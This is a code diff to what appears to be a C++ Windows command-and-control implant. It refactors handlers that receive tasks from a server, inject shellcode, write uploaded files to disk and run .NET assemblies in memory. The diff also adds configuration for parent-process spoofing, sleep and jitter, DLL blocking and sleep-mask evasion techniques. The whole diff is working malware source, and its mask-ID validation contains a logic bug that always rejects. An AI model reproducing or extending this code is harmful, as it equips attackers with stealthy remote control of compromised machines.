@@ -18,13 +18,14 @@ auto DECLFN Task::Dispatcher(
     ULONG Length = 0;
 
     PVOID  DataPsr = NULL;
-    SIZE_T PsrLen  = 0;
+    UINT64 PsrLen  = 0;
 
     Kh->Pkg->AddInt32( Package, Kh->Job.Qtt );
 
     KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );
 
     Kh->Pkg->Transmit( Package, &DataPsr, &PsrLen );
+    KhDbg( "transmited return %p [%d bytes]", DataPsr, PsrLen );
     if ( !DataPsr || !PsrLen ) return;
 
     Kh->Psr->NewTask( Parser, DataPsr, PsrLen );
@@ -88,7 +89,7 @@ auto DECLFN Task::Injection(
     BOOL     Success  = FALSE;
 
     if ( TypeInj == KH_INJECTION_SC ) {
-        switch ( Kh->InjCtx.Sc.TechniqueID ) {
+        switch ( Kh->Inj->Ctx.Sc.TechniqueID ) {
             case KhClassic: {
                 Success = Kh->Inj->Classic( Buffer, BuffLen, 0, 0, &Base, &TdHandle ); break;
             }
@@ -97,7 +98,7 @@ auto DECLFN Task::Injection(
             }
         }
     } else if ( TypeInj == KH_INJECTION_PE ) {
-        switch ( Kh->InjCtx.PE.TechniqueID ) {
+        switch ( Kh->Inj->Ctx.PE.TechniqueID ) {
             case KhReflection: {
                 // Success = Kh->Inj->Reflection(  )
             }
@@ -133,36 +134,36 @@ auto DECLFN Task::Upload(
     ULONG TmpLength  = 0;
     ULONG AvalBytes  = 0;
 
-    Kh->Transport.Tf.Up.FileID = Kh->Psr->GetStr( Parser, 0 );
-    Kh->Transport.Tf.Up.Path   = Kh->Psr->GetStr( Parser, 0 );
+    Kh->Tsp->Tf.Up.FileID = Kh->Psr->GetStr( Parser, 0 );
+    Kh->Tsp->Tf.Up.Path   = Kh->Psr->GetStr( Parser, 0 );
 
-    if ( !Kh->Transport.Tf.Up.Path ) {
-        Kh->Transport.Tf.Up.Path = ".";
+    if ( !Kh->Tsp->Tf.Up.Path ) {
+        Kh->Tsp->Tf.Up.Path = ".";
     }
 
-    KhDbg( "upload file at path %s with id: %s", Kh->Transport.Tf.Up.Path, Kh->Transport.Tf.Up.FileID );
+    KhDbg( "upload file at path %s with id: %s", Kh->Tsp->Tf.Up.Path, Kh->Tsp->Tf.Up.FileID );
 
-    Kh->Transport.Tf.Up.CurrentChunk = 1;
+    Kh->Tsp->Tf.Up.CurrentChunk = 1;
 
     do {
         Package = Kh->Pkg->Create( TkUpload, Parser );
 
-        Kh->Pkg->AddInt32( Package, Kh->Transport.Tf.Up.CurrentChunk );
-        Kh->Pkg->AddString( Package, Kh->Transport.Tf.Up.FileID );
-        Kh->Pkg->AddString( Package, Kh->Transport.Tf.Up.Path );
-        Kh->Pkg->AddInt32( Package, Kh->Transport.Tf.Up.ChunkSize );
+        Kh->Pkg->AddInt32( Package, Kh->Tsp->Tf.Up.CurrentChunk );
+        Kh->Pkg->AddString( Package, Kh->Tsp->Tf.Up.FileID );
+        Kh->Pkg->AddString( Package, Kh->Tsp->Tf.Up.Path );
+        Kh->Pkg->AddInt32( Package, Kh->Tsp->Tf.Up.ChunkSize );
     
         Kh->Pkg->Transmit( Package, &Data, &Length );
         Kh->Psr->New( UpParser, Data, Length );
     
         Success = Kh->Psr->GetByte( UpParser );
         if ( !Success ) {
-            KhDbg( "received fail in the chunk: %d", Kh->Transport.Tf.Up.CurrentChunk );
+            KhDbg( "received fail in the chunk: %d", Kh->Tsp->Tf.Up.CurrentChunk );
         }
     
-        Kh->Transport.Tf.Up.FileID       = Kh->Psr->GetStr( UpParser, &UUIDLen );
-        Kh->Transport.Tf.Up.TotalChunks  = Kh->Psr->GetInt32( UpParser );
-        Kh->Transport.Tf.Up.CurrentChunk = Kh->Psr->GetInt32( UpParser );
+        Kh->Tsp->Tf.Up.FileID       = Kh->Psr->GetStr( UpParser, &UUIDLen );
+        Kh->Tsp->Tf.Up.TotalChunks  = Kh->Psr->GetInt32( UpParser );
+        Kh->Tsp->Tf.Up.CurrentChunk = Kh->Psr->GetInt32( UpParser );
     
         TmpBuffer = Kh->Psr->GetBytes( UpParser, &TmpLength );
         if ( !FileBuffer ) {
@@ -180,14 +181,14 @@ auto DECLFN Task::Upload(
         Mem::Copy( C_PTR( U_PTR( FileBuffer ) + AvalBytes ), TmpBuffer, TmpLength );
 
         FileLength += TmpLength;
-        Kh->Transport.Tf.Up.CurrentChunk++;
+        Kh->Tsp->Tf.Up.CurrentChunk++;
 
         Kh->Psr->Destroy( UpParser );
 
-    } while ( Kh->Transport.Tf.Up.CurrentChunk <= Kh->Transport.Tf.Up.TotalChunks );
+    } while ( Kh->Tsp->Tf.Up.CurrentChunk <= Kh->Tsp->Tf.Up.TotalChunks );
 
     FileHandle = Kh->Krnl32.CreateFileA(
-        Kh->Transport.Tf.Up.Path, GENERIC_ALL, FILE_SHARE_READ, 
+        Kh->Tsp->Tf.Up.Path, GENERIC_ALL, FILE_SHARE_READ, 
         0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0 
     );
     if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _KH_END;
@@ -198,7 +199,7 @@ auto DECLFN Task::Upload(
 
     KhDbg( 
         "full uploaded with success. file at %p [%d bytes] with chunks: %d", 
-        FileBuffer, FileLength, Kh->Transport.Tf.Up.CurrentChunk -1 
+        FileBuffer, FileLength, Kh->Tsp->Tf.Up.CurrentChunk -1 
     );
 
 _KH_END:
@@ -373,51 +374,43 @@ auto DECLFN Task::SelfDelete(
 auto DECLFN Task::Dotnet(
     _In_ PPARSER Parser
 ) -> ERROR_CODE {
-    // PBYTE AssemblyBytes = { 0 };
-    // ULONG AssemblySize  = 0;
+    PPACKAGE Package     = Kh->Pkg->Create( TkDotnet, Parser );
+    UINT8    SbCommandID = Kh->Psr->GetByte( Parser );
 
-    // PWSTR AppDomainName = NULL;
-    // PWSTR Arguments     = NULL;
+    ERROR_CODE Code = ERROR_SUCCESS;
 
-    // PCHAR OutBuffer = NULL;
-    // ULONG OutLength = 0;
+    KhDbg( "sub command id: %d", SbCommandID );
 
-    // BOOL             IsLoadable   = FALSE;
-    // HRESULT          HResult      = 0;
-    // _AppDomain*      AppDomainRet = { 0 };
-    // IUnknown*        AppDomainTk  = { 0 };
-    // IEnumUnknown*    EnumUnknown  = { 0 };
-    // ICLRMetaHost*    MetaHost     = { 0 };
-    // ICLRRuntimeInfo* RuntimeInfo  = { 0 };
-    // ICorRuntimeHost* RuntimeHost  = { 0 };
+    switch ( SbCommandID ) {
+        case SbDotInline: {
+            PWSTR Arguments  = Kh->Psr->GetWstr( Parser, 0 );
+            PWSTR AppDomName = Kh->Psr->GetWstr( Parser, 0 );
+            BOOL  KeepLoad   = Kh->Psr->GetInt32( Parser );
+            PWSTR Version    = Kh->Psr->GetWstr( Parser, 0 );
+            ULONG AsmSize    = 0;
+            PBYTE AsmBytes   = Kh->Psr->GetBytes( Parser, &AsmSize );
 
-    // HResult = CLRCreateInstance( CLSID_CLRMetaHost, IID_ICLRMetaHost, (PVOID*)&MetaHost );
-    // KhDbg( "create clr instance %lx", HResult );
-    // if ( !HResult ) return 0;
+            if ( !Arguments ) Arguments = L"";
 
-    // HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUnknown );
-    // KhDbg( "enum installed runtimes %lx", HResult );
-    // if ( !HResult ) return 0;
+            Code = Kh->Dot->Inline( 
+                AsmBytes, AsmSize, Arguments, AppDomName, Version, KeepLoad 
+            );
 
-    // HResult = MetaHost->GetRuntime( L"v4.0.30319", IID_ICLRRuntimeInfo, (PVOID*)&RuntimeInfo );
-    // KhDbg( "get runtime %lx", HResult );
-    // if ( !HResult ) return 0;
+            Kh->Pkg->AddBytes( Package, (PUCHAR)Kh->Dot->Buffer.a, Kh->Dot->Buffer.s );
+            
+            break;
+        }
+        case SbDotList: {
+            break;
+        }
+        case SbDotInvoke: {
+            break;
+       }
+    }   
 
-    // HResult = RuntimeInfo->IsLoadable( &IsLoadable );
-    // KhDbg( "is loadable: %s", IsLoadable ? "TRUE" : "FALSE" );
-    // if ( !HResult || !IsLoadable ) return 0;
+    Kh->Pkg->Transmit( Package, 0, 0 );
 
-    // HResult = RuntimeInfo->GetInterface( CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (PVOID*)&RuntimeHost );
-    // KhDbg( "get interface %lx", HResult );
-    // if ( !HResult ) return 0;
-
-    // HResult = RuntimeHost->Start();
-
-    // RuntimeHost->CreateDomain( AppDomainName, 0, &AppDomainTk );
-
-    // AppDomainTk->QueryInterface( IID_PPV_ARGS( &AppDomainRet ) );
-
-    
+    return Code;
 }
 
 auto DECLFN Task::GetInfo(
@@ -439,10 +432,10 @@ auto DECLFN Task::GetInfo(
     Kh->Pkg->AddInt32(  Package, Kh->Session.ProcessArch );
     Kh->Pkg->AddByte(   Package, Kh->Session.Elevated    );
 
-    Kh->Pkg->AddByte(   Package, Kh->Mask.TechniqueID      );
-    Kh->Pkg->AddByte(   Package, Kh->Mask.Heap             );
-    Kh->Pkg->AddInt32(  Package, Kh->Mask.JmpGadget        );
-    Kh->Pkg->AddInt32(  Package, Kh->Mask.NtContinueGadget );
+    Kh->Pkg->AddByte(   Package, Kh->Mk->Ctx.TechniqueID      );
+    Kh->Pkg->AddByte(   Package, Kh->Mk->Ctx.Heap             );
+    Kh->Pkg->AddInt32(  Package, Kh->Mk->Ctx.JmpGadget        );
+    Kh->Pkg->AddInt32(  Package, Kh->Mk->Ctx.NtContinueGadget );
 
     Kh->Pkg->AddString( Package, Kh->Machine.UserName      );
     Kh->Pkg->AddString( Package, Kh->Machine.CompName      );
@@ -473,22 +466,36 @@ auto DECLFN Task::Config(
     ULONG    TmpVal      = 0;
     BOOL     Success     = FALSE;
 
+    KhDbg( "sub command id: %d", SbCommandID );
+
     switch ( SbCommandID ) {
         case SbCfgPpid: {
             ULONG ParentID = Kh->Psr->GetInt32( Parser );
-            Kh->PsCtx.ParentID = ParentID;
+            Kh->Ps->Ctx.ParentID = ParentID;
 
-            KhDbg( "parent ID set to %d\n", Kh->PsCtx.ParentID ); break;
+            KhDbg( "parent id set to %d\n", Kh->Ps->Ctx.ParentID ); break;
+        }
+        case SbCfgSleep: {
+            ULONG NewSleep = Kh->Psr->GetInt32( Parser );
+            Kh->Session.SleepTime = NewSleep * 1000;
+
+            KhDbg( "new sleep time set to %d", Kh->Session.SleepTime % 1000 ); break;
+        }
+        case SbCfgJitter: {
+            ULONG NewJitter = Kh->Psr->GetInt32( Parser );
+            Kh->Session.Jitter = NewJitter;
+
+            KhDbg( "new jitter set to %d", Kh->Session.Jitter ); break;
         }
         case SbCfgBlockDlls: {
-            BOOL BlockDlls  = Kh->Psr->GetByte( Parser );
-            Kh->PsCtx.BlockDlls = BlockDlls;
+            BOOL BlockDlls  = Kh->Psr->GetInt32( Parser );
+            Kh->Ps->Ctx.BlockDlls = BlockDlls;
             
-            KhDbg( "block non microsoft dlls is %s\n", Kh->PsCtx.BlockDlls ? "enabled" : "disabled" ); break;
+            KhDbg( "block non microsoft dlls is %s\n", Kh->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); break;
         }
         case SbCfgCurDir: {
-            if ( Kh->PsCtx.CurrentDir ) {
-                Kh->Hp->Free( Kh->PsCtx.CurrentDir, Str::LengthA( Kh->PsCtx.CurrentDir ) );
+            if ( Kh->Ps->Ctx.CurrentDir ) {
+                Kh->Hp->Free( Kh->Ps->Ctx.CurrentDir, Str::LengthA( Kh->Ps->Ctx.CurrentDir ) );
             }
 
             PCHAR CurDirTmp  = Kh->Psr->GetStr( Parser, &TmpVal );
@@ -496,25 +503,36 @@ auto DECLFN Task::Config(
 
             Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
 
-            Kh->PsCtx.CurrentDir = CurrentDir; break;
+            Kh->Ps->Ctx.CurrentDir = CurrentDir; break;
         }
         case SbCfgMask: {
-            UINT8 TechniqueID = Kh->Psr->GetByte( Parser );
-            if ( !TechniqueID ) {
+            INT32 TechniqueID = Kh->Psr->GetInt32( Parser );
+            if ( 
+                TechniqueID != MaskTimer || 
+                TechniqueID != MaskApc   || 
+                TechniqueID != MaskWait 
+            ) {
                 KhDbg( "invalid mask id" );
                 return KH_ERROR_INVALID_MASK_ID;
             }
         
-            Kh->Mask.TechniqueID = TechniqueID;
+            Kh->Mk->Ctx.TechniqueID = TechniqueID;
         
             KhDbg( 
-                "mask technique id set to %d (%s)", Kh->Mask.TechniqueID, 
-                Kh->Mask.TechniqueID == MaskTimer ? "timer" : 
-                ( Kh->Mask.TechniqueID == MaskApc   ? "apc" : 
-                ( Kh->Mask.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
+                "mask technique id set to %d (%s)", Kh->Mk->Ctx.TechniqueID, 
+                  Kh->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
+                ( Kh->Mk->Ctx.TechniqueID == MaskApc   ? "apc" : 
+                ( Kh->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
             );
         }
+        case sbCfgSpawn: {
+            // PCHAR Spawn = Kh->InjCtx.;
+        }
     }
+
+    Kh->Pkg->Transmit( Package, 0, 0 );
+
+    return KhRetSuccess;
 }
 
 auto DECLFN Task::Process(
